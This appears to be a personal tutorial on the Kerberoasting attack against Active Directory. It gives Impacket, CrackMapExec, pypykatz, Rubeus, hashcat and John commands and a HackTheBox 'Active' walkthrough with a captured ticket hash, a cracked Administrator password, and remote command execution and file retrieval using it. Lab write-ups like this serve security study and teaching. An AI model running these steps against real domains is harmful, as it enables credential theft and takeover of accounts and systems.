# Theory 


When asking the KDC (Key Distribution Center) for a Service Ticket (ST), the requesting user needs to send a valid TGT (Ticket Granting Ticket) and the service name (`sname`) of the service wanted. If the TGT is valid, and if the service exists, the KDC sends the ST to the requesting user.

Multiple formats are accepted for the `sname` field: servicePrincipalName (SPN), sAMAccountName (SAN), userPrincipalName (UPN), etc. (see [Kerberos tickets](/ad/movement/kerberos#tickets)).

The ST is encrypted with the requested service account's NT hash. If an attacker has a valid TGT and knows a service (by its SAN or SPN), he can request a ST for this service and crack it offline later in an attempt to retrieve that service account's password.

In most situations, services accounts are machine accounts, which have very complex, long, and random passwords. But if a service account, with a human-defined password, has a SPN set, attackers can request a ST for this service and attempt to crack it offline. This is Kerberoasting.

# Practice 

Unlike [ASREProasting](/ad/movement/kerberos/asreproast), this attack can only be carried out with a prior foothold (valid domain credentials), except in the [Kerberoasting without pre-authentication](/ad/movement/kerberos/kerberoast#undefined) scenario.

## UNIX-like

The [Impacket](https://github.com/SecureAuthCorp/impacket) script [GetUserSPNs](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) (Python) can perform all the necessary steps to request a ST for a service given its SPN (or name) and valid domain credentials.

The Kerberoasting attack can be conducted without knowing any SPN of the target account, since a service ticket can be request for as long as the service's SAN (`sAMAccountName`) is known. ([swarm.ptsecurity.com](https://swarm.ptsecurity.com/kerberoasting-without-spns/))

Nota bene, Kerberos can deliver service tickets even if the service has no SPN at all, but then the service's SAN must end with `$`, and in this case it's hard to know for sure if the service's password is defined by a human. Kerberoast attacks usually target user accounts with at least one SPN (`servicePrincipalName`) since they probably have human-defined passwords (sources: [Twitter](https://twitter.com/SteveSyfuhs/status/1613956603807690753) and [[MS-KILE] section 3.3.5.1.1](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/a7ad31b0-37a4-4344-b9a7-01d4d086097e)).

# with a password

```
GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'
```

# with an NT hash

```
GetUserSPNs.py -outputfile kerberoastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
```

This can also be achieved with [CrackMapExec](https://github.com/mpgn/CrackMapExec) (Python).

```
crackmapexec ldap $TARGETS -u $USER -p $PASSWORD --kerberoasting kerberoastables.txt --kdcHost $KeyDistributionCenter
```

Using [pypykatz](https://github.com/skelsec/pypykatz/wiki/Kerberos-spnroast-command) (Python) it is possible to request an RC4 encrypted ST even when AES encryption is enabled (and if RC4 is still accepted of course). The tool features an -e flag which specifies what encryption type should be requested (default to 23, i.e. RC4). Trying to crack `$krb5tgs$23` takes less time than for `krb5tgs$18`.

```
pypykatz kerberos spnroast -d $DOMAIN -t $TARGET_USER -e 23 'kerberos+password://DOMAIN\username:Password@IP
```


## Windows

[Rubeus]([https://github.com/GhostPack/Rubeus])(C#) can be used for that purpose.

```
Rubeus.exe kerberoast /outfile:kerberoastables.txt
```


# Cracking 


[Hashcat](https://github.com/hashcat/hashcat) and [JohnTheRipper](https://github.com/magnumripper/JohnTheRipper) can then be used to try [cracking the hash](/ad/movement/credentials/cracking).

hashcat -m 13100 kerberoastables.txt $wordlist

john --format=krb5tgs --wordlist=$wordlist kerberoastables.txt

# [Kerberoast w/o pre-authentication](#kerberoast-w-o-pre-authentication)

In September 2022, [Charlie Cark](https://twitter.com/exploitph) explained how Service Tickets could be obtained through `AS-REQ` requests (which are usually used for TGT requests), instead of the usual `TGS-REQ`. He demonstrated (and [implemented](https://github.com/GhostPack/Rubeus/pull/139)) how to abuse this in a Kerberoasting scenario.

If an attacker knows of an account for which pre-authentication isn't required (i.e. an [ASREProastable](/ad/movement/kerberos/asreproast) account), as well as one (or multiple) service accounts to target, a Kerberoast attack can be attempted without having to control any Active Directory account (since pre-authentication won't be required).

## UNIX-like


The [Impacket](https://github.com/SecureAuthCorp/impacket) script [GetUserSPNs](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) (Python) can perform all the necessary steps to request a ST for a service given its SPN (or name) and valid domain credentials.

_At the time of writing, Sept. 28th 2022,_ [_the pull request (#1413)_](https://github.com/SecureAuthCorp/impacket/pull/1413) _adding the_ `_-no-preauth_` _option for_ `_GetUserSPNs.py_` _is pending._

```
GetUserSPNs.py -no-preauth "bobby" -usersfile "services.txt" -dc-host "DC_IP_or_HOST" "DOMAIN.LOCAL"/
```

```
usersfile example

1 srv01

2 cifs/srv02.domain.local

3 cifs/srv02
```


## Windows

[Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be used for that purpose.

_At the time of writing, Sept. 28th 2022,_ [_the pull request (#139)_](https://github.com/GhostPack/Rubeus/pull/139) _adding the_ `_/nopreauth_` _option for Rubeus'_ `_kerberoast_` _command is pending._

```
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"DOMAIN.LOCAL" /dc:"DC01.DOMAIN.LOCAL" /nopreauth:"nopreauth_user" /spn:"target_service"
```

## Targeted Kerberoasting

If an attacker controls an account with the rights to add an SPN to another ([`GenericAll`](/ad/movement/dacl#genericall), [`GenericWrite`](/ad/movement/dacl#genericwrite)), it can be abused to make that other account vulnerable to Kerberoast (see [exploitation](/ad/movement/dacl/targeted-kerberoasting)).



-----

# Real case scenario

with `Active` From hackthebox


## Enumeration

```
kali@kali ~/BloodHound.py (master)> python bloodhound.py -d htb.local -v --zip -c All -dc active.htb -ns 10.10.10.100
```



```
kali@kali ~> impacket-GetADUsers active.htb/SVC_TGS -all -dc-ip 10.10.10.100
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Querying 10.10.10.100 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2018-07-18 15:06:40.351723  2024-02-13 03:51:09.883745 
Guest                                                 <never>              <never>             
krbtgt                                                2018-07-18 14:50:36.972031  <never>             
SVC_TGS                                               2018-07-18 16:14:38.402764  2024-02-13 04:37:18.576608 
```


## Kerbroasting

```
kali@kali ~> impacket-GetUserSPNs active.htb/SVC_TGS -dc-ip 10.10.10.100 -outputfile kerberoastables.txt
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2024-02-13 03:51:09.883745             



[-] CCache file is not found. Skipping...
kali@kali ~> cat kerberoastables.txt
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$c53c87592442f618cb27bc8f73be4b89$62d0bfeef615f0f0c778b541bf5ed02f00d51143869949596370d50ffc488780acf0ca304470f0c4c328b78729ecab53968d777ae9f990b22d988e276257e11eb2aadbb9c2b3926e33b86a48899ebe6de35f3b64fa8e96ef97c86f14587ade0f53ed164aa86ea543fbbae8434fc4f0508eba80ac22970e07e5cd53fd149b29fbe4f53766da54861f649deb538ac5826a43dfa2c4d6f9166d0127800f0dbf9b14f8530de142ab89b4035bd1216d80c0e0f3c27e5d07d0bc1375fd1c5e4005105920f2be98a0eb0725e9f4c3b8aa56f10b4a254341e072f1ce5ad471ea7b4486123bc5f947e47e16dbfa1889eee26772692e26888a4766105b63203289268818ea1ab41557ec3a8962dd31b25fbec4ab4a6a374dafa8eedf8db47b3470739ef5c3901576e13fbb5ae42df311770c30bb211c43031c49170d0bccf1eb106ee3b28c110dd9cbce3c7f3427efcacb67b12c4b59b3820119b1025b2e117d621944b2842fee0db79f4fb90281e8d4057cbed4842f540e0046bd80572ebea21278b32b0ed58330143eb2e00ddf47dc7fea8f0ac035f399fce32753d68d58d61513dae814cb5cf501f842eb333d8f7b7b67b5f777d857f6397c8a4a57d75719bf6d132853aa4ddb8dce8b41db2e18365ac07ac556ff67e6de204ac652f8b8b92d72c5e8ef5a266f4b9bb522673945487172e3c7c0f784742298fd888e8e71f9a8cbb1de974c2d5ee08f813b9445414a9b51d0970f1b93905e0fd9e95871403b6df7b35170e6225abf3e23706e0472ab74d74f5aebd23b919c46ca0f1d24c7eaf59530e0179b17ecdd1a1f085d8f2dde22bb65479e2709493a7ae692acf2f9ef75bf318ef044fbf90fd308b78aa0592585a66ee9ccb6dbf8998f11e22d4e51e7270b850b6b3e92d6b432003a93abc9b85832f99a5f60d42822f5fc65d498983e36961ec5ad0602a7084383c1fb8d0f1a7149ef8b506b3038e3cf050014b3a0f0663f40f7f231621c794a4c1c953f6f227a4239a38fc75d020f1ce3502be2411c77948e1a45d9e3937954a2a864047ca6314b151bbfdbd8895982a25498bc5150feacc4cfa600d5aa72439a78ab47923ba9afd091342fe593e8f985990a9491b56f5fe1b1f0582596249038a509fde935ace1757174ed521f4238f2603e804be95c126104726c64051f05198a5576ebabbc0944df2ccb97e669b256ca3adf09353015dd13b7a429ca48b4d44f8814889720d88168b280b9188501d85db9405a

```

## Hash cracking

```
kali@kali ~> john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerberoastables.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?) <-------------------------------------------- Password
1g 0:00:00:22 DONE (2024-02-13 05:03) 0.04393g/s 463004p/s 463004c/s 463004C/s Tiffani1432..Thrash1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```


Now we have gotten the hash and cracked, the next step is to use these credentials to see what services you can log into!


Example!

## SMB




## WMI

```
kali@kali ~> nxc wmi 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968' -x 'dir C:\Users\Administrator\Desktop'
RPC         10.10.10.100    135    DC               [*] Windows NT 6.1 Build 7601 (name:DC) (domain:active.htb)
WMI         10.10.10.100    135    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
WMI         10.10.10.100    135    DC               [+] Executed command: "dir C:\Users\Administrator\Desktop" via wmiexec
WMI         10.10.10.100    135    DC               Volume in drive C has no label.
WMI         10.10.10.100    135    DC               Volume Serial Number is 15BB-D59C
WMI         10.10.10.100    135    DC               
WMI         10.10.10.100    135    DC               Directory of C:\Users\Administrator\Desktop
WMI         10.10.10.100    135    DC               
WMI         10.10.10.100    135    DC               21/01/2021  06:49 ��    <DIR>          .
WMI         10.10.10.100    135    DC               21/01/2021  06:49 ��    <DIR>          ..
WMI         10.10.10.100    135    DC               13/02/2024  10:51 ��                34 root.txt
WMI         10.10.10.100    135    DC               1 File(s)             34 bytes
WMI         10.10.10.100    135    DC               2 Dir(s)   1.108.332.544 bytes free

```

```
kali@kali ~> nxc smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968' --get-file \\Users\\Administrator\\Desktop\\root.txt root2.txt
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
SMB         10.10.10.100    445    DC               [*] Copying "\Users\Administrator\Desktop\root.txt" to "root2.txt"
SMB         10.10.10.100    445    DC               [+] File "\Users\Administrator\Desktop\root.txt" was downloaded to "root2.txt"

```

